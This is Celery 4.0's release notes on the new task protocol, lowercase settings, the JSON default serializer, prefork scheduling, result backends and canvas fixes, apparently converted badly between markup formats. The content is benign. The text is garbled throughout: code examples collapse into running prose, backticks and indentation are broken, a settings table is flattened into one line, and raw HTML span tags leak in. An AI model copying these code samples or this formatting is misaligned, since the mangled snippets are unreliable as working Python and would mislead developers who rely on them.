
**Now to the good news**...

### New Task Message Protocol

This version introduces a brand new task message protocol, the first major change to the protocol since the beginning of the project.

The new protocol is enabled by default in this version and since the new version isn't backwards compatible you have to be careful when upgrading.

The 3.1.25 version was released to add compatibility with the new protocol so the easiest way to upgrade is to upgrade to that version first, then upgrade to 4.0 in a second deployment.

If you wish to keep using the old protocol you may also configure the protocol version number used:

`` `python     app = Celery()     app.conf.task_protocol = 1  Read more about the features available in the new protocol in the news ``\` section found later in this document.

### Lowercase setting names

In the pursuit of beauty all settings are now renamed to be in all lowercase and some setting names have been renamed for consistency.

This change is fully backwards compatible so you can still use the uppercase setting names, but we would like you to upgrade as soon as possible and you can do this automatically using the `celery upgrade settings` command:

`` `console     $ celery upgrade settings proj/settings.py  This command will modify your module in-place to use the new lower-case ``<span class="title-ref"> names (if you want uppercase with a "</span><span class="title-ref">CELERY</span><span class="title-ref">" prefix see block below), and save a backup in :file:\`proj/settings.py.orig</span>.

> If you're loading Celery configuration from the Django settings module then you'll want to keep using the uppercase names.
> 
> You also want to use a `CELERY_` prefix so that no Celery settings collide with Django settings used by other apps.
> 
> To do this, you'll first need to convert your settings file to use the new consistent naming scheme, and add the prefix to all Celery related settings:
> 
> `` `console     $ celery upgrade settings proj/settings.py --django  After upgrading the settings file, you need to set the prefix explicitly in your ``proj/celery.py\`\` module:
> 
> ``` python
> app.config_from_object('django.conf:settings', namespace='CELERY')
> ```
> 
> You can find the most up to date Django Celery integration example here: \[django-first-steps\](\#django-first-steps).
> 
> \> **Note**

  - \>  
    This will also add a prefix to settings that didn't previously have one, for example `BROKER_URL` should be written `CELERY_BROKER_URL` with a namespace of `CELERY` `CELERY_BROKER_URL`.
    
    Luckily you don't have to manually change the files, as the `celery upgrade settings --django` program should do the right thing.

The loader will try to detect if your configuration is using the new format, `` ` and act accordingly, but this also means you're not allowed to mix and match new and old setting names, that's unless you provide a value for both alternatives.  The major difference between previous versions, apart from the lower case names, are the renaming of some prefixes, like ``[celerybeat]()`to`[beat]()`,`[celeryd]()`to`[worker]()`.  The`[celery]()`prefix has also been removed, and task related settings from this name-space is now prefixed by`[task]()`, worker related settings with`[worker]()`.  Apart from this most of the settings will be the same in lowercase, apart from a few special ones:  =====================================  ========================================================== **Setting name**                       **Replace with** =====================================  ==========================================================`CELERY\_MAX\_CACHED\_RESULTS`` :setting:`result_cache_max` ``CELERY\_MESSAGE\_COMPRESSION``:setting:`result_compression`/:setting:`task_compression`.``CELERY\_TASK\_RESULT\_EXPIRES`` :setting:`result_expires` ``CELERY\_RESULT\_DBURI`` :setting:`result_backend` ``CELERY\_RESULT\_ENGINE\_OPTIONS`` :setting:`database_engine_options` ``-\*-\_DB\_SHORT\_LIVED\_SESSIONS`` :setting:`database_short_lived_sessions` ``CELERY\_RESULT\_DB\_TABLE\_NAMES`` :setting:`database_db_names` ``CELERY\_ACKS\_LATE`` :setting:`task_acks_late` ``CELERY\_ALWAYS\_EAGER`` :setting:`task_always_eager` ``CELERY\_ANNOTATIONS`` :setting:`task_annotations` ``CELERY\_MESSAGE\_COMPRESSION`` :setting:`task_compression` ``CELERY\_CREATE\_MISSING\_QUEUES`` :setting:`task_create_missing_queues` ``CELERY\_DEFAULT\_DELIVERY\_MODE`` :setting:`task_default_delivery_mode` ``CELERY\_DEFAULT\_EXCHANGE`` :setting:`task_default_exchange` ``CELERY\_DEFAULT\_EXCHANGE\_TYPE`` :setting:`task_default_exchange_type` ``CELERY\_DEFAULT\_QUEUE`` :setting:`task_default_queue` ``CELERY\_DEFAULT\_RATE\_LIMIT`` :setting:`task_default_rate_limit` ``CELERY\_DEFAULT\_ROUTING\_KEY`` :setting:`task_default_routing_key` ``-"-\_EAGER\_PROPAGATES\_EXCEPTIONS`` :setting:`task_eager_propagates` ``CELERY\_IGNORE\_RESULT`` :setting:`task_ignore_result` ``CELERY\_TASK\_PUBLISH\_RETRY`` :setting:`task_publish_retry` ``CELERY\_TASK\_PUBLISH\_RETRY\_POLICY`` :setting:`task_publish_retry_policy` ``CELERY\_QUEUES`` :setting:`task_queues` ``CELERY\_ROUTES`` :setting:`task_routes` ``CELERY\_SEND\_TASK\_SENT\_EVENT`` :setting:`task_send_sent_event` ``CELERY\_TASK\_SERIALIZER`` :setting:`task_serializer` ``CELERYD\_TASK\_SOFT\_TIME\_LIMIT`` :setting:`task_soft_time_limit` ``CELERYD\_TASK\_TIME\_LIMIT`` :setting:`task_time_limit` ``CELERY\_TRACK\_STARTED`` :setting:`task_track_started` ``CELERY\_DISABLE\_RATE\_LIMITS`` :setting:`worker_disable_rate_limits` ``CELERY\_ENABLE\_REMOTE\_CONTROL`` :setting:`worker_enable_remote_control` ``CELERYD\_SEND\_EVENTS``:setting:`worker_send_task_events` =====================================  ==========================================================  You can see a full table of the changes in [conf-old-settings-map](#conf-old-settings-map).  Json is now the default serializer ----------------------------------  The time has finally come to end the reign of :mod:`pickle` as the default serialization mechanism, and json is the default serializer starting from this version.  This change was [announced with the release of Celery 3.1 <last-version-to-enable-pickle>](#announced-with-the-release-of-celery-3.1 <last-version-to-enable-pickle>).  If you're still depending on :mod:`pickle` being the default serializer, then you have to configure your app before upgrading to 4.0:``\`python task\_serializer = 'pickle' result\_serializer = 'pickle' accept\_content = {'pickle'}

The Json serializer now also supports some additional types:

  - <span class="title-ref">\~datetime.datetime</span>, <span class="title-ref">\~datetime.time</span>, <span class="title-ref">\~datetime.date</span>
    
    > Converted to json text, in ISO-8601 format.

  - <span class="title-ref">\~decimal.Decimal</span>
    
    > Converted to json text.

  - <span class="title-ref">django.utils.functional.Promise</span>
    
    > Django only: Lazy strings used for translation etc., are evaluated and conversion to a json type is attempted.

  - <span class="title-ref">uuid.UUID</span>
    
    > Converted to json text.

You can also define a `__json__` method on your custom classes to support `` ` JSON serialization (must return a json compatible type): ``\`python class Person: first\_name = None last\_name = None address = None

>   - def \_\_json\_\_(self):
>     
>       - return {  
>         'first\_name': self.first\_name, 'last\_name': self.last\_name, 'address': self.address,
>     
>     }

The Task base class no longer automatically register tasks `` ` ----------------------------------------------------------  The `~@Task` class is no longer using a special meta-class that automatically registers the task in the task registry.  Instead this is now handled by the `@task` decorators.  If you're still using class based tasks, then you need to register these manually: ``\`python class CustomTask(Task): def run(self): print('running') CustomTask = app.register\_task(CustomTask())

The best practice is to use custom task classes only for overriding `` ` general behavior, and then using the task decorator to realize the task: ``\`python @app.task(bind=True, base=CustomTask) def custom(self): print('running')

This change also means that the `abstract` attribute of the task `` ` no longer has any effect.  .. _v400-typing:  Task argument checking ----------------------  The arguments of the task are now verified when calling the task, even asynchronously: ``\`pycon \>\>\> @app.task ... def add(x, y): ... return x + y

> \>\>\> add.delay(8, 8) \<AsyncResult: f59d71ca-1549-43e0-be41-4e8821a83c0c\>
> 
> \>\>\> add.delay(8) Traceback (most recent call last): File "\<stdin\>", line 1, in \<module\> File "celery/app/task.py", line 376, in delay return self.apply\_async(args, kwargs) File "celery/app/task.py", line 485, in apply\_async check\_arguments(*(args or ()),*\*(kwargs or {})) TypeError: add() takes exactly 2 arguments (1 given)

You can disable the argument checking for any task by setting its `` ` `~@Task.typing` attribute to `False`: ``\`pycon \>\>\> @app.task(typing=False) ... def add(x, y): ... return x + y

Or if you would like to disable this completely for all tasks `` ` you can pass ``strict\_typing=False`when creating the app:`\`python app = Celery(..., strict\_typing=False)

Redis Events not backward compatible `` ` ------------------------------------  The Redis ``fanout\_patterns`and`fanout\_prefix`transport options are now enabled by default.  Workers/monitors without these flags enabled won't be able to see workers with this flag disabled. They can still execute tasks, but they cannot receive each others monitoring messages.  You can upgrade in a backward compatible manner by first configuring your 3.1 workers and monitors to enable the settings, before the final upgrade to 4.0:`\`python BROKER\_TRANSPORT\_OPTIONS = { 'fanout\_patterns': True, 'fanout\_prefix': True, }

Redis Priorities Reversed `` ` -------------------------  Priority 0 is now lowest, 9 is highest.  This change was made to make priority support consistent with how it works in AMQP.  Contributed by **Alex Koshelev**.  Django: Auto-discover now supports Django app configurations ------------------------------------------------------------  The ``autodiscover\_tasks()`function can now be called without arguments, and the Django handler will automatically find your installed apps:`\`python app.autodiscover\_tasks()

The Django integration \[example in the documentation \](\#example-in-the-documentation )``<django-first-steps>` has been updated to use the argument-less call.  This also ensures compatibility with the new, ehm,``AppConfig``stuff introduced in recent Django versions.  Worker direct queues no longer use auto-delete ----------------------------------------------  Workers/clients running 4.0 will no longer be able to send worker direct messages to workers running older versions, and vice versa.  If you're relying on worker direct messages you should upgrade your 3.x workers and clients to use the new routing settings first, by replacing `celery.utils.worker_direct` with this implementation:``\`python from kombu import Exchange, Queue

> worker\_direct\_exchange = Exchange('C.dq2')
> 
>   - def worker\_direct(hostname):
>     
>       - return Queue(  
>         '{hostname}.dq2'.format(hostname), exchange=worker\_direct\_exchange, routing\_key=hostname,
>     
>     )

This feature closed Issue \#2492.

Old command-line programs removed `` ` ---------------------------------  Installing Celery will no longer install the ``celeryd`,`celerybeat`and`celeryd-multi`programs.  This was announced with the release of Celery 3.1, but you may still have scripts pointing to the old names, so make sure you update these to use the new umbrella command:  +-------------------+--------------+-------------------------------------+ | Program           | New Status   | Replacement                         | +===================+==============+=====================================+ |`celeryd``| **REMOVED**  | :program:`celery worker`            | +-------------------+--------------+-------------------------------------+ |``celerybeat``| **REMOVED**  | :program:`celery beat`              | +-------------------+--------------+-------------------------------------+ |``celeryd-multi``| **REMOVED**  | :program:`celery multi`             | +-------------------+--------------+-------------------------------------+  .. _v400-news:  News ====  New protocol highlights -----------------------  The new protocol fixes many problems with the old one, and enables some long-requested features:  - Most of the data are now sent as message headers, instead of being   serialized with the message body.      In version 1 of the protocol the worker always had to deserialize     the message to be able to read task meta-data like the task id,     name, etc. This also meant that the worker was forced to double-decode     the data, first deserializing the message on receipt, serializing     the message again to send to child process, then finally the child process     deserializes the message again.      Keeping the meta-data fields in the message headers means the worker     doesn't actually have to decode the payload before delivering     the task to the child process, and also that it's now possible     for the worker to reroute a task written in a language different     from Python to a different worker.  - A new``lang`message header can be used to specify the programming   language the task is written in.  - Worker stores results for internal errors like`ContentDisallowed``,   and other deserialization errors.  - Worker stores results and sends monitoring events for unregistered   task errors.  - Worker calls callbacks/errbacks even when the result is sent by the   parent process (e.g., `WorkerLostError` when a child process   terminates, deserialization errors, unregistered tasks).  - A new``origin`header contains information about the process sending   the task (worker node-name, or PID and host-name information).  - A new`shadow`header allows you to modify the task name used in logs.      This is useful for dispatch like patterns, like a task that calls     any function using pickle (don't do this at home):`\`python from celery import Task from celery.utils.imports import qualname

> class call\_as\_task(Task):
> 
> >   - def shadow\_name(self, args, kwargs, options):  
> >     return 'call\_as\_task:{0}'.format(qualname(args\[0\]))
> > 
> > def run(self, fun, *args,kwargs): return fun(*args, \*\*kwargs)
> 
> call\_as\_task = app.register\_task(call\_as\_task())

  - New `argsrepr` and `kwargsrepr` fields contain textual representations of the task arguments (possibly truncated) for use in logs, monitors, etc.
    
    > This means the worker doesn't have to deserialize the message payload to display the task arguments for informational purposes.

  - Chains now use a dedicated `chain` field enabling support for chains of thousands and more tasks.

  - New `parent_id` and `root_id` headers adds information about a tasks relationship with other tasks.
    
    >   - `parent_id` is the task id of the task that called this task
    >   - `root_id` is the first task in the work-flow.
    > 
    > These fields can be used to improve monitors like flower to group related messages together (like chains, groups, chords, complete work-flows, etc).

  - `app.TaskProducer` replaced by <span class="title-ref">@amqp.create\_task\_message</span> and <span class="title-ref">@amqp.send\_task\_message</span>.
    
    > Dividing the responsibilities into creating and sending means that people who want to send messages using a Python AMQP client directly, don't have to implement the protocol.
    > 
    > The <span class="title-ref">@amqp.create\_task\_message</span> method calls either <span class="title-ref">@amqp.as\_task\_v2</span>, or <span class="title-ref">@amqp.as\_task\_v1</span> depending on the configured task protocol, and returns a special <span class="title-ref">\~celery.app.amqp.task\_message</span> tuple containing the headers, properties and body of the task message.

<div class="seealso">

The new task protocol is documented in full here: \[message-protocol-task-v2\](\#message-protocol-task-v2).

</div>

Prefork Pool Improvements `` ` -------------------------  Tasks now log from the child process ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Logging of task success/failure now happens from the child process executing the task.  As a result logging utilities, like Sentry can get full information about tasks, including variables in the traceback stack. ``-Ofair`is now the default scheduling strategy ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  To re-enable the default behavior in 3.1 use the`-Ofast`command-line option.  There's been lots of confusion about what the`-Ofair`command-line option does, and using the term "prefetch" in explanations have probably not helped given how confusing this terminology is in AMQP.  When a Celery worker using the prefork pool receives a task, it needs to delegate that task to a child process for execution.  The prefork pool has a configurable number of child processes (`--concurrency`) that can be used to execute tasks, and each child process uses pipes/sockets to communicate with the parent process:  - inqueue (pipe/socket): parent sends task to the child process - outqueue (pipe/socket): child sends result/return value to the parent.  In Celery 3.1 the default scheduling mechanism was simply to send the task to the first`inqueue`that was writable, with some heuristics to make sure we round-robin between them to ensure each child process would receive the same amount of tasks.  This means that in the default scheduling strategy, a worker may send tasks to the same child process that is already executing a task.  If that task is long running, it may block the waiting task for a long time.  Even worse, hundreds of short-running tasks may be stuck behind a long running task even when there are child processes free to do work.  The`-Ofair``scheduling strategy was added to avoid this situation, and when enabled it adds the rule that no task should be sent to the a child process that is already executing a task.  The fair scheduling strategy may perform slightly worse if you have only short running tasks.  Limit child process resident memory size ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. :sha:`5cae0e754128750a893524dcba4ae030c414de33`  You can now limit the maximum amount of memory allocated per prefork pool child process by setting the worker :option:`--max-memory-per-child <celery worker --max-memory-per-child>` option, or the :setting:`worker_max_memory_per_child` setting.  The limit is for RSS/resident memory size and is specified in kilobytes.  A child process having exceeded the limit will be terminated and replaced with a new process after the currently executing task returns.  See [worker-max-memory-per-child](#worker-max-memory-per-child) for more information.  Contributed by **Dave Smith**.  One log-file per child process ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Init-scrips and :program:`celery multi` now uses the `%I` log file format option (e.g., :file:`/var/log/celery/%n%I.log`).  This change was necessary to ensure each child process has a separate log file after moving task logging to the child process, as multiple processes writing to the same log file can cause corruption.  You're encouraged to upgrade your init-scripts and :program:`celery multi` arguments to use this new option.  Transports ----------  RabbitMQ priority queue support ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  See [routing-options-rabbitmq-priorities](#routing-options-rabbitmq-priorities) for more information.  Contributed by **Gerald Manipon**.  Configure broker URL for read/write separately ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  New :setting:`broker_read_url` and :setting:`broker_write_url` settings have been added so that separate broker URLs can be provided for connections used for consuming/publishing.  In addition to the configuration options, two new methods have been added the app API:      -``app.connection\_for\_read()`-`app.connection\_for\_write()`These should now be used in place of`app.connection()`to specify the intent of the required connection.  > **Note** >      Two connection pools are available:`app.pool`(read), and`app.producer\_pool``(write). The latter doesn't actually give connections     but full `kombu.Producer` instances.``\`python def publish\_some\_message(app, producer=None): with app.producer\_or\_acquire(producer) as producer: ...

>   - def consume\_messages(app, connection=None):
>     
>       - with app.connection\_or\_acquire(connection) as connection:  
>         ...

RabbitMQ queue extensions support `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Queue declarations can now set a message TTL and queue expiry time directly, by using the ``message\_ttl`and`expires``arguments  New arguments have been added to `~kombu.Queue` that lets you directly and conveniently configure RabbitMQ queue extensions in queue declarations:  -``Queue(expires=20.0)``Set queue expiry time in float seconds.      See `kombu.Queue.expires`.  -``Queue(message\_ttl=30.0)``Set queue message time-to-live float seconds.      See `kombu.Queue.message_ttl`.  -``Queue(max\_length=1000)``Set queue max length (number of messages) as int.      See `kombu.Queue.max_length`.  -``Queue(max\_length\_bytes=1000)``Set queue max length (message size total in bytes) as int.      See `kombu.Queue.max_length_bytes`.  -``Queue(max\_priority=10)`Declare queue to be a priority queue that routes messages     based on the`priority``field of the message.      See `kombu.Queue.max_priority`.  Amazon SQS transport now officially supported ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  The SQS broker transport has been rewritten to use async I/O and as such joins RabbitMQ, Redis and QPid as officially supported transports.  The new implementation also takes advantage of long polling, and closes several issues related to using SQS as a broker.  This work was sponsored by Nextdoor.  Apache QPid transport now officially supported ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Contributed by **Brian Bouterse**.  Redis: Support for Sentinel ---------------------------  You can point the connection to a list of sentinel URLs like:``\`text sentinel://0.0.0.0:26379;sentinel://0.0.0.0:26380/...

where each sentinel is separated by a <span class="title-ref">;</span>. Multiple sentinels are handled `` ` by `kombu.Connection` constructor, and placed in the alternative list of servers to connect to in case of connection failure.  Contributed by **Sergey Azovskov**, and **Lorenzo Mancini**.  Tasks -----  Task Auto-retry Decorator ~~~~~~~~~~~~~~~~~~~~~~~~~  Writing custom retry handling for exception events is so common that we now have built-in support for it.  For this a new ``autoretry\_for`argument is now supported by the task decorators, where you can specify a tuple of exceptions to automatically retry for:`\`python from twitter.exceptions import FailWhaleError

> @app.task(autoretry\_for=(FailWhaleError,)) def refresh\_timeline(user): return twitter.refresh\_timeline(user)

See \[task-autoretry\](\#task-autoretry) for more information.

Contributed by **Dmitry Malinovsky**.

`Task.replace` Improvements `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  - ``self.replace(signature)`can now replace any task, chord or group,   and the signature to replace with can be a chord, group or any other   type of signature.  - No longer inherits the callbacks and errbacks of the existing task.      If you replace a node in a tree, then you wouldn't expect the new node to     inherit the children of the old node.  -`Task.replace\_in\_chord`has been removed, use`.replace``instead.  - If the replacement is a group, that group will be automatically converted   to a chord, where the callback "accumulates" the results of the group tasks.      A new built-in task (`celery.accumulate` was added for this purpose)  Contributed by **Steeve Morin**, and **Ask Solem**.  Remote Task Tracebacks ~~~~~~~~~~~~~~~~~~~~~~  The new :setting:`task_remote_tracebacks` will make task tracebacks more useful by injecting the stack of the remote worker.  This feature requires the additional :pypi:`tblib` library.  Contributed by **Ionel Cristian Mărieș**.  Handling task connection errors ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Connection related errors occurring while sending a task is now re-raised as a `kombu.exceptions.OperationalError` error:``\`pycon \>\>\> try: ... add.delay(2, 2) ... except add.OperationalError as exc: ... print('Could not send task %r: %r' % (add, exc))

See \[calling-connection-errors\](\#calling-connection-errors) for more information.

Gevent/Eventlet: Dedicated thread for consuming results `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  When using :pypi:`gevent`, or :pypi:`eventlet` there is now a single thread responsible for consuming events.  This means that if you have many calls retrieving results, there will be a dedicated thread for consuming them: ``\`python result = add.delay(2, 2)

> \# this call will delegate to the result consumer thread: \# once the consumer thread has received the result this greenlet can \# continue. value = result.get(timeout=3)

This makes performing RPC calls when using gevent/eventlet perform much `` ` better. ``AsyncResult.then(on\_success, on\_error)``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  The AsyncResult API has been extended to support the `~vine.promise` protocol.  This currently only works with the RPC (amqp) and Redis result backends, but lets you attach callbacks to when tasks finish:``\`python import gevent.monkey monkey.patch\_all()

> import time from celery import Celery
> 
> app = Celery(broker='amqp://', backend='rpc')
> 
> @app.task def add(x, y): return x + y
> 
>   - def on\_result\_ready(result):  
>     print('Received result for id %r: %r' % (result.id, result.result,))
> 
> add.delay(2, 2).then(on\_result\_ready)
> 
> time.sleep(3) \# run gevent event loop for a while.

Demonstrated using `gevent` here, but really this is an API that's more `` ` useful in callback-based event loops like :pypi:`twisted`, or :pypi:`tornado`.  New Task Router API ~~~~~~~~~~~~~~~~~~~  The :setting:`task_routes` setting can now hold functions, and map routes now support glob patterns and regexes.  Instead of using router classes you can now simply define a function: ``\`python def route\_for\_task(name, args, kwargs, options, task=None, \*\*kwargs): from proj import tasks

>   - if name == tasks.add.name:  
>     return {'queue': 'hipri'}

If you don't need the arguments you can use start arguments, just make `` ` sure you always also accept star arguments so that we have the ability to add more features in the future: ``\`python def route\_for\_task(name, *args,*\*kwargs): from proj import tasks if name == tasks.add.name: return {'queue': 'hipri', 'priority': 9}

Both the `options` argument and the new `task` keyword argument `` ` are new to the function-style routers, and will make it easier to write routers based on execution options, or properties of the task.  The optional ``task``keyword argument won't be set if a task is called by name using `@send_task`.  For more examples, including using glob/regexes in routers please see :setting:`task_routes` and [routing-automatic](#routing-automatic).  Canvas Refactor ~~~~~~~~~~~~~~~  The canvas/work-flow implementation have been heavily refactored to fix some long outstanding issues.  .. :sha:`d79dcd8e82c5e41f39abd07ffed81ca58052bcd2` .. :sha:`1e9dd26592eb2b93f1cb16deb771cfc65ab79612` .. :sha:`e442df61b2ff1fe855881c1e2ff9acc970090f54` .. :sha:`0673da5c09ac22bdd49ba811c470b73a036ee776`  - Error callbacks can now take real exception and traceback instances   (Issue #2538).``\`pycon \>\>\> add.s(2, 2).on\_error(log\_error.s()).delay()

> Where `log_error` could be defined as:
> 
> ``` python
> @app.task
> def log_error(request, exc, traceback):
>     with open(os.path.join('/var/errors', request.id), 'a') as fh:
>         print('--\n\n{0} {1} {2}'.format(
>             task_id, exc, traceback), file=fh)
> ```
> 
> See \[guide-canvas\](\#guide-canvas) for more examples.

  - `chain(a, b, c)` now works the same as `a | b | c`.
    
    > This means chain may no longer return an instance of `chain`, instead it may optimize the workflow so that e.g. two groups chained together becomes one group.

\- Now unrolls groups within groups into a single group (Issue \#1509). `` ` - chunks/map/starmap tasks now routes based on the target task - chords and chains can now be immutable. - Fixed bug where serialized signatures weren't converted back into   signatures (Issue #2078)      Fix contributed by **Ross Deane**.  - Fixed problem where chains and groups didn't work when using JSON   serialization (Issue #2076).      Fix contributed by **Ross Deane**.  - Creating a chord no longer results in multiple values for keyword   argument 'task_id' (Issue #2225).      Fix contributed by **Aneil Mallavarapu**.  - Fixed issue where the wrong result is returned when a chain   contains a chord as the penultimate task.      Fix contributed by **Aneil Mallavarapu**.  - Special case of ``group(A.s() | group(B.s() | C.s()))`now works.  - Chain: Fixed bug with incorrect id set when a subtask is also a chain.  -`group | group`is now flattened into a single group (Issue #2573).  - Fixed issue where`group | task`wasn't upgrading correctly   to chord (Issue #2922).  - Chords now properly sets`result.parent`links.  -`chunks`/`map`/`starmap`are now routed based on the target task.  -`Signature.link`now works when argument is scalar (not a list)     (Issue #2019).  -`group()`now properly forwards keyword arguments (Issue #3426).      Fix contributed by **Samuel Giffard**.  - A`chord`where the header group only consists of a single task   is now turned into a simple chain.  - Passing a`link`argument to`group.apply\_async()`now raises an error   (Issue #3508).  -`chord | sig``now attaches to the chord callback (Issue #3356).  Periodic Tasks --------------  New API for configuring periodic tasks ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  This new API enables you to use signatures when defining periodic tasks, removing the chance of mistyping task names.  An example of the new API is [here <beat-entries>](#here-<beat-entries>).  .. :sha:`bc18d0859c1570f5eb59f5a969d1d32c63af764b` .. :sha:`132d8d94d38f4050db876f56a841d5a5e487b25b`  Optimized Beat implementation ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  The :program:`celery beat` implementation has been optimized for millions of periodic tasks by using a heap to schedule entries.  Contributed by **Ask Solem** and **Alexander Koshelev**.  Schedule tasks based on sunrise, sunset, dawn and dusk ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  See [beat-solar](#beat-solar) for more information.  Contributed by **Mark Parncutt**.  Result Backends ---------------  RPC Result Backend matured ~~~~~~~~~~~~~~~~~~~~~~~~~~  Lots of bugs in the previously experimental RPC result backend have been fixed and can now be considered to production use.  Contributed by **Ask Solem**, **Morris Tweed**.  Redis: Result backend optimizations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~``result.get()`is now using pub/sub for streaming task results ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  Calling`result.get()`when using the Redis result backend used to be extremely expensive as it was using polling to wait for the result to become available. A default polling interval of 0.5 seconds didn't help performance, but was necessary to avoid a spin loop.  The new implementation is using Redis Pub/Sub mechanisms to publish and retrieve results immediately, greatly improving task round-trip times.  Contributed by **Yaroslav Zhavoronkov** and **Ask Solem**.  New optimized chord join implementation ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  This was an experimental feature introduced in Celery 3.1, that could only be enabled by adding`?new\_join=1``to the result backend URL configuration.  We feel that the implementation has been tested thoroughly enough to be considered stable and enabled by default.  The new implementation greatly reduces the overhead of chords, and especially with larger chords the performance benefit can be massive.  New Riak result backend introduced ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  See [conf-riak-result-backend](#conf-riak-result-backend) for more information.  Contributed by **Gilles Dartiguelongue**, **Alman One** and **NoKriK**.  New CouchDB result backend introduced ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  See [conf-couchdb-result-backend](#conf-couchdb-result-backend) for more information.  Contributed by **Nathan Van Gheem**.  New Consul result backend introduced ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Add support for Consul as a backend using the Key/Value store of Consul.  Consul has an HTTP API where through you can store keys with their values.  The backend extends KeyValueStoreBackend and implements most of the methods.  Mainly to set, get and remove objects.  This allows Celery to store Task results in the K/V store of Consul.  Consul also allows to set a TTL on keys using the Sessions from Consul. This way the backend supports auto expiry of Task results.  For more information on Consul visit https://consul.io/  The backend uses :pypi:`python-consul` for talking to the HTTP API. This package is fully Python 3 compliant just as this backend is:``\`console $ pip install python-consul

That installs the required package to talk to Consul's HTTP API from Python.

You can also specify consul as an extension in your dependency on Celery:

``` console
$ pip install celery[consul]
```

See \[bundles\](\#bundles) for more information.

Contributed by **Wido den Hollander**.

Brand new Cassandra result backend `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  A brand new Cassandra backend utilizing the new :pypi:`cassandra-driver` library is replacing the old result backend using the older :pypi:`pycassa` library.  See [conf-cassandra-result-backend](#conf-cassandra-result-backend) for more information.  To depend on Celery with Cassandra as the result backend use: ``\`console $ pip install celery\[cassandra\]

You can also combine multiple extension requirements, `` ` please see [bundles](#bundles) for more information.  .. # XXX What changed?  New Elasticsearch result backend introduced ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  See [conf-elasticsearch-result-backend](#conf-elasticsearch-result-backend) for more information.  To depend on Celery with Elasticsearch as the result backend use: ``\`console $ pip install celery\[elasticsearch\]

You can also combine multiple extension requirements, `` ` please see [bundles](#bundles) for more information.  Contributed by **Ahmet Demir**.  New File-system result backend introduced ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  See [conf-filesystem-result-backend](#conf-filesystem-result-backend) for more information.  Contributed by **Môshe van der Sterre**.  Event Batching --------------  Events are now buffered in the worker and sent as a list, reducing the overhead required to send monitoring events.  For authors of custom event monitors there will be no action required as long as you're using the Python Celery helpers (`~@events.Receiver`) to implement your monitor.  However, if you're parsing raw event messages you must now account for batched event messages,  as they differ from normal event messages in the following way:  - The routing key for a batch of event messages will be set to ``\<event-group\>.multi`where the only batched event group   is currently`task`(giving a routing key of`task.multi``).  - The message body will be a serialized list-of-dictionaries instead   of a dictionary. Each item in the list can be regarded   as a normal event message body.  .. :sha:`03399b4d7c26fb593e61acf34f111b66b340ba4e`  In Other News... ----------------  Requirements ~~~~~~~~~~~~  - Now depends on [Kombu 4.0 <kombu:version-4.0>](#kombu-4.0-<kombu:version-4.0>).  - Now depends on :pypi:`billiard` version 3.5.  - No longer depends on :pypi:`anyjson`. Good-bye old friend :(   Tasks ~~~~~  - The "anon-exchange" is now used for simple name-name direct routing.    This increases performance as it completely bypasses the routing table,   in addition it also improves reliability for the Redis broker transport.  - An empty ResultSet now evaluates to True.      Fix contributed by **Colin McIntosh**.  - The default routing key (:setting:`task_default_routing_key`) and exchange   name (:setting:`task_default_exchange`) is now taken from the   :setting:`task_default_queue` setting.      This means that to change the name of the default queue, you now     only have to set a single setting.  - New :setting:`task_reject_on_worker_lost` setting, and   `~@Task.reject_on_worker_lost` task attribute decides what happens   when the child worker process executing a late ack task is terminated.      Contributed by **Michael Permana**.  -``Task.subtask`renamed to`Task.signature`with alias.  -`Task.subtask\_from\_request`renamed to`Task.signature\_from\_request`with alias.  - The`delivery\_mode``attribute for `kombu.Queue` is now   respected (Issue #1953).  - Routes in :setting:`task-routes` can now specify a   `~kombu.Queue` instance directly.      Example:``\`python task\_routes = {'proj.tasks.add': {'queue': Queue('add')}}

  - `AsyncResult` now raises <span class="title-ref">ValueError</span> if task\_id is None. (Issue \#1996).

  - Retried tasks didn't forward expires setting (Issue \#3297).

  - `result.get()` now supports an `on_message` argument to set a callback to be called for every message received.

  - New abstract classes added:
    
    >   - <span class="title-ref">\~celery.utils.abstract.CallableTask</span>
    >     
    >     > Looks like a task.
    > 
    >   - <span class="title-ref">\~celery.utils.abstract.CallableSignature</span>
    >     
    >     > Looks like a task signature.

  - `Task.replace` now properly forwards callbacks (Issue \#2722).
    
    > Fix contributed by **Nicolas Unravel**.

  - `Task.replace`: Append to chain/chord (Closes \#3232)
    
    > Fixed issue \#3232, adding the signature to the chain (if there's any). Fixed the chord suppress if the given signature contains one.
    > 
    > Fix contributed by :github\_user:<span class="title-ref">honux</span>.

  - Task retry now also throws in eager mode.
    
    > Fix contributed by **Feanil Patel**.

